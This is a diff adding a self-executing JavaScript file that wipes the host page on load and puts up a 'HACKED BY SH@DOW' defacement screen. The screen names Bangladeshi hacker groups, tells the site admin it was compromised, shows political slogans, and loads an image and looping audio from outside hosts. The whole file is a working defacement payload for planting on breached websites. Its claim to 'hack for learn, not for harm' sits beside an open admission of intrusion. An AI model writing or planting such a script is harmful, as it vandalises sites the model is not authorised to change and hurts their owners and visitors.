@@ -1,0 +1,530 @@
+(function () {
+
+  function run() {
+    document.body.innerHTML = `
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>H@CKED BY SH@DOW</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Creepster&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      user-select: none;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background: #0a0a0a;
+      color: #00ff41;
+      font-family: 'Rajdhani', 'Courier New', monospace;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow-x: hidden;
+      overflow-y: auto;
+      position: relative;
+    }
+
+    .bg-layer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+
+    .bg-grid {
+      background-image: 
+        linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+    }
+
+    .bg-glow {
+      background: radial-gradient(ellipse at center, rgba(0, 255, 65, 0.08) 0%, transparent 70%);
+      animation: pulseGlow 4s ease-in-out infinite;
+    }
+
+    @keyframes pulseGlow {
+      0%, 100% { opacity: 0.5; transform: scale(1); }
+      50% { opacity: 1; transform: scale(1.2); }
+    }
+
+    #matrixCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      opacity: 0.15;
+      pointer-events: none;
+    }
+
+    .scanline {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: repeating-linear-gradient(
+        0deg,
+        rgba(0, 255, 65, 0.03) 0px,
+        rgba(0, 255, 65, 0.03) 2px,
+        transparent 2px,
+        transparent 6px
+      );
+      pointer-events: none;
+      z-index: 5;
+      animation: scanMove 10s linear infinite;
+    }
+
+    @keyframes scanMove {
+      0% { transform: translateY(-100%); }
+      100% { transform: translateY(100%); }
+    }
+
+    .main-container {
+      position: relative;
+      z-index: 10;
+      width: 92%;
+      max-width: 1100px;
+      padding: 40px 30px;
+      margin: 40px auto;
+      background: rgba(10, 10, 10, 0.85);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(0, 255, 65, 0.2);
+      border-radius: 16px;
+      box-shadow: 0 0 80px rgba(0, 255, 65, 0.05), inset 0 0 60px rgba(0, 255, 65, 0.02);
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 40px;
+      align-items: center;
+      animation: containerIn 1s ease-out;
+    }
+
+    @keyframes containerIn {
+      0% { opacity: 0; transform: translateY(30px) scale(0.98); }
+      100% { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .left-side {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .logo-wrapper {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .logo {
+      width: 140px;
+      height: 140px;
+      border-radius: 50%;
+      border: 2px solid rgba(0, 255, 65, 0.4);
+      box-shadow: 0 0 40px rgba(0, 255, 65, 0.15), inset 0 0 40px rgba(0, 255, 65, 0.05);
+      transition: all 0.4s ease;
+      animation: logoPulse 3s ease-in-out infinite;
+    }
+
+    @keyframes logoPulse {
+      0%, 100% { box-shadow: 0 0 30px rgba(0, 255, 65, 0.1); }
+      50% { box-shadow: 0 0 60px rgba(0, 255, 65, 0.25); }
+    }
+
+    .glitch-ring {
+      position: absolute;
+      top: -8px;
+      left: -8px;
+      width: calc(100% + 16px);
+      height: calc(100% + 16px);
+      border-radius: 50%;
+      border: 1px solid rgba(0, 255, 65, 0.15);
+      animation: ringRotate 8s linear infinite;
+    }
+
+    .glitch-ring::before {
+      content: '';
+      position: absolute;
+      top: -4px;
+      left: -4px;
+      width: calc(100% + 8px);
+      height: calc(100% + 8px);
+      border-radius: 50%;
+      border: 1px solid rgba(0, 255, 65, 0.1);
+      animation: ringRotate 6s linear infinite reverse;
+    }
+
+    @keyframes ringRotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .main-title {
+      font-family: 'Orbitron', monospace;
+      font-size: clamp(1.8rem, 5vw, 3.2rem);
+      font-weight: 900;
+      color: #00ff41;
+      text-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+      letter-spacing: 4px;
+      margin: 10px 0;
+      line-height: 1.2;
+    }
+
+    .main-title .highlight {
+      color: #ffffff;
+      text-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
+    }
+
+    .sub-title {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: clamp(0.8rem, 1.5vw, 1rem);
+      color: rgba(0, 255, 65, 0.5);
+      letter-spacing: 6px;
+      text-transform: uppercase;
+      margin-bottom: 15px;
+    }
+
+    .badge-group {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin: 15px 0;
+    }
+
+    .badge {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.75rem;
+      padding: 6px 18px;
+      border: 1px solid rgba(0, 255, 65, 0.25);
+      color: #00ff41;
+      background: rgba(0, 255, 65, 0.03);
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .badge::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.08), transparent);
+      animation: badgeSweep 4s infinite;
+    }
+
+    @keyframes badgeSweep {
+      0% { left: -100%; }
+      50% { left: 100%; }
+      100% { left: 100%; }
+    }
+
+    .badge:hover {
+      border-color: #00ff41;
+      background: rgba(0, 255, 65, 0.08);
+    }
+
+    .right-side {
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+    }
+
+    .message-card {
+      background: rgba(0, 255, 65, 0.02);
+      border-left: 2px solid rgba(0, 255, 65, 0.3);
+      padding: 18px 22px;
+      border-radius: 4px;
+      transition: all 0.3s ease;
+    }
+
+    .message-card:hover {
+      border-left-color: #00ff41;
+      background: rgba(0, 255, 65, 0.04);
+    }
+
+    .message-card .label {
+      font-size: 0.65rem;
+      color: rgba(0, 255, 65, 0.4);
+      text-transform: uppercase;
+      letter-spacing: 4px;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+
+    .message-card .content {
+      font-size: clamp(0.85rem, 1.4vw, 1rem);
+      color: rgba(255, 255, 255, 0.8);
+      line-height: 1.6;
+      font-weight: 300;
+    }
+
+    .message-card .content strong {
+      color: #00ff41;
+      font-weight: 600;
+    }
+
+    .highlight-red {
+      color: #ff0044 !important;
+      text-shadow: 0 0 20px rgba(255, 0, 68, 0.3);
+    }
+
+    .quote-section {
+      margin-top: 5px;
+      padding: 16px 22px;
+      border: 1px solid rgba(0, 255, 65, 0.08);
+      border-radius: 4px;
+      background: rgba(0, 255, 65, 0.02);
+      text-align: center;
+    }
+
+    .quote-section .quote-text {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: clamp(0.85rem, 1.5vw, 1.1rem);
+      color: rgba(255, 255, 255, 0.6);
+      font-style: italic;
+      line-height: 1.6;
+    }
+
+    .quote-section .quote-text .highlight {
+      color: #00ff41;
+      font-style: normal;
+    }
+
+    .footer-note {
+      grid-column: 1 / -1;
+      text-align: center;
+      padding-top: 15px;
+      border-top: 1px solid rgba(0, 255, 65, 0.06);
+      font-size: 0.65rem;
+      color: rgba(0, 255, 65, 0.2);
+      letter-spacing: 2px;
+      font-family: 'Share Tech Mono', monospace;
+    }
+
+    @media (max-width: 768px) {
+      .main-container {
+        grid-template-columns: 1fr;
+        gap: 25px;
+        padding: 25px 20px;
+        margin: 20px auto;
+        max-height: none;
+      }
+
+      .logo {
+        width: 100px;
+        height: 100px;
+      }
+
+      .main-title {
+        font-size: 1.8rem;
+      }
+
+      .badge {
+        font-size: 0.6rem;
+        padding: 4px 12px;
+      }
+
+      .message-card {
+        padding: 14px 16px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .main-container {
+        padding: 18px 14px;
+        gap: 18px;
+      }
+
+      .logo {
+        width: 80px;
+        height: 80px;
+      }
+
+      .main-title {
+        font-size: 1.4rem;
+        letter-spacing: 2px;
+      }
+
+      .message-card .content {
+        font-size: 0.75rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="bg-layer bg-grid"></div>
+  <div class="bg-layer bg-glow"></div>
+
+  <canvas id="matrixCanvas"></canvas>
+
+  <div class="scanline"></div>
+
+  <div class="main-container">
+
+    <div class="left-side">
+      <div class="logo-wrapper">
+        <div class="glitch-ring"></div>
+        <img src="https://i.ibb.co.com/SDt1fHX9/logo.png" alt="SH@DOW" class="logo">
+      </div>
+
+      <div class="main-title">
+        <span class="highlight">HACKED</span> BY<br>
+        SH@DOW
+      </div>
+
+      <div class="sub-title">From Bangladesh</div>
+
+      <div class="badge-group">
+        <span class="badge">⚠️ Darknet Cyber Force ⚠️</span>
+        <span class="badge">⚠️ Chandpur Cyber Team ⚠️</span>
+      </div>
+    </div>
+
+    <div class="right-side">
+
+      <div class="message-card">
+        <div class="label">⚠️ Attention Admin</div>
+        <div class="content">
+          Your website has been compromised due to critical security vulnerabilities. 
+          Upgrade your security immediately. <strong>Don't forget to stay with PALESTINE</strong>
+        </div>
+      </div>
+
+      <div class="message-card">
+        <div class="label">📢 Message</div>
+        <div class="content">
+          <em>"I Hack for learn, not for harm. Stay Secure, Stay safe."</em>
+        </div>
+      </div>
+
+      <div class="message-card">
+        <div class="label">🔒 Security Note</div>
+        <div class="content">
+          <strong>SH@DOW</strong> — Hacking is an art, but like any art, it must be used with 
+          <strong>responsibility and ethics</strong>. 
+          <span style="color:#ff0044;">Do not harm</span> any normal person, 
+          <span style="color:#ff0044;">do not target</span> educational platforms, 
+          <span style="color:#ff0044;">do not misuse</span> your skills.
+          <br><br>
+          <span style="color:#00ff41;">True hackers protect, they don't destroy.</span>
+          <span style="color:#00ff41;">They build, they don't break.</span>
+          <span style="color:#00ff41;">They educate, they don't exploit.</span>
+          <br><br>
+          Stay curious. Stay ethical. <strong style="color:#00ff41;">SH@DOW</strong>
+        </div>
+      </div>
+
+      <div class="quote-section">
+        <div class="quote-text">
+          “<span class="highlight">Free Free PALESTINE.</span><br>
+          From The River, To The Sea, <span class="highlight">PALESTINE Will Be Free</span>”
+        </div>
+      </div>
+
+    </div>
+
+    <div class="footer-note">
+      ⚡ SH@DOW // Gray Hat Hacker // Learn, Protect, Educate ⚡
+    </div>
+
+  </div>
+
+  <audio id="myAudio" loop preload="auto">
+    <source src="https://files.catbox.moe/wqaqua.m4a" type="audio/mp4">
+  </audio>
+
+  <script>
+    (() => {
+      
+      const canvas = document.getElementById('matrixCanvas');
+      if (canvas) {
+        const ctx = canvas.getContext('2d');
+        let width, height, columns, drops;
+        const fontSize = 14;
+        const columnWidth = 18;
+        const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%&";
+
+        function initCanvas() {
+          width = window.innerWidth;
+          height = window.innerHeight;
+          canvas.width = width;
+          canvas.height = height;
+          columns = Math.floor(width / columnWidth);
+          drops = new Array(columns).fill(0).map(() => Math.floor(Math.random() * -(height / fontSize)));
+        }
+
+        function drawMatrix() {
+          ctx.fillStyle = "rgba(0, 0, 0, 0.04)";
+          ctx.fillRect(0, 0, width, height);
+          ctx.font = `bold ${fontSize}px 'Courier New', monospace`;
+
+          for (let i = 0; i < drops.length; i++) {
+            const char = chars[Math.floor(Math.random() * chars.length)];
+            const intensity = Math.floor(Math.random() * 100 + 155);
+            ctx.fillStyle = `rgb(0, ${intensity}, 40)`;
+            const x = i * columnWidth;
+            const y = drops[i] * fontSize;
+            ctx.fillText(char, x, y);
+
+            if (y > height && Math.random() > 0.975) {
+              drops[i] = 0;
+            }
+            drops[i]++;
+          }
+        }
+
+        window.addEventListener('resize', initCanvas);
+        initCanvas();
+        setInterval(drawMatrix, 35);
+      }
+
+      
+      const audio = document.getElementById("myAudio");
+      let played = false;
+      function playAudio() {
+        if (!played && audio) {
+          audio.volume = 0.15;
+          audio.play().then(() => { 
+            played = true; 
+          }).catch(() => {});
+        }
+      }
+      
+      document.addEventListener('click', playAudio, { once: true });
+      document.addEventListener('touchstart', playAudio, { once: true });
+      document.addEventListener('keydown', playAudio, { once: true });
+    })();
+  </script>
+</body>
+</html>
+`;
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", run);
+  } else run();
+
+})();
